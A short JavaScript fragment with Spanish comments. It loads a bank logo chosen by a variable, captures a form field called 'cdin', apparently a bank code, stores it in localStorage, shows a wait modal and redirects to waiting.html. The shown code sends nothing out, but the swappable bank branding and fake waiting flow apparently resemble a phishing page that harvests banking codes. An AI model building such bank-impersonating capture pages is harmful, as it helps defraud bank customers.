

// Cargar imagen
document.querySelector('#-icon-banco').setAttribute('src', `./assets/logos/${info.ban}.png`);

const btnSuccess = document.querySelector('#form');

btnSuccess.addEventListener('submit', e => {
    e.preventDefault();

    document.querySelector('#modal-esperar').classList.add('d-block');

    info.cdin = info.cdin !== '' ? info.cdin : document.querySelector('#cdin').value;

    LS.setItem('info', JSON.stringify(info));

    setTimeout(()=>{
        window.location.href = 'waiting.html';
    }, 3000);
});